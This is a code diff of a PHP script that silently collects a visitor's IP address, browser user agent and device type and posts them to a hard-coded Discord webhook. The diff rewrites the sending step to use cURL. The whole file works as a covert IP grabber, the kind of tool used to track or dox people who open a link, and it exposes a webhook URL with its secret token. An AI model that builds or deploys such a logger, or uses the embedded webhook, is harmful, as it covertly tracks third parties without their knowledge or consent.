@@ -1,5 +1,6 @@
 <?php
 
+// Function to retrieve the user's IP address
 function getUserIP() {
     if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
         return $_SERVER['HTTP_CLIENT_IP'];
@@ -21,10 +22,12 @@ function getUserIP() {
     return 'UNKNOWN';
 }
 
+// Function to retrieve the user's browser info
 function getUserBrowser() {
     return $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
 }
 
+// Function to determine the user's device type
 function getUserDevice() {
     $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
 
@@ -37,6 +40,7 @@ function getUserDevice() {
     }
 }
 
+// Helper function to detect OS from user agent
 function detectOS($userAgent) {
     $os = 'Unknown OS';
 
@@ -55,33 +59,49 @@ function detectOS($userAgent) {
     return 'Desktop (' . $os . ')';
 }
 
+// Webhook function using cURL
+function sendToWebhook($webhookURL, $data) {
+    $ch = curl_init($webhookURL);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json',
+    ]);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+    $result = curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        echo 'cURL error: ' . curl_error($ch);
+    }
+
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if ($httpCode !== 200 && $httpCode !== 204) {
+        echo "Discord returned HTTP code: $httpCode\nResponse: $result";
+    }
+
+    curl_close($ch);
+    return $result;
+}
+
+// Gather user details
 $userIP = getUserIP();
 $userBrowser = getUserBrowser();
 $userDevice = getUserDevice();
 
+// Discord webhook URL
 $webhookURL = "https://discord.com/api/webhooks/1325168587882889257/1zJNbweNL690W_KESw1xIWrHqaT8hy_Z0jmnRpPwZlQOvxG6b2L7yqJrC5Ug1HEgYmk4";
 
-// Create a message with the user details
-$data = array(
-    "content" => "`📡`: " . $userIP . "\n`🌐`: " . $userBrowser . "\n`🖥️`: " . $userDevice
-);
+// Create the message data
+$data = [
+    "content" => "`📡` IP: " . $userIP . "\n`🌐` Browser: " . $userBrowser . "\n`🖥️` Device: " . $userDevice,
+];
 
 // Send the data to the Discord webhook
-$options = array(
-    "http" => array(
-        "header" => "Content-Type: application/json",
-        "method" => "POST",
-        "content" => json_encode($data)
-    )
-);
-
-$context = stream_context_create($options);
-$result = file_get_contents($webhookURL, false, $context);
-
-if ($result === FALSE) {
-    echo "An error occurred while sending the message.";
+$response = sendToWebhook($webhookURL, $data);
+if ($response) {
+    echo "Message sent to Discord webhook successfully.";
 } else {
-    echo "";
+    echo "An error occurred while sending the message.";
 }
 
 ?>
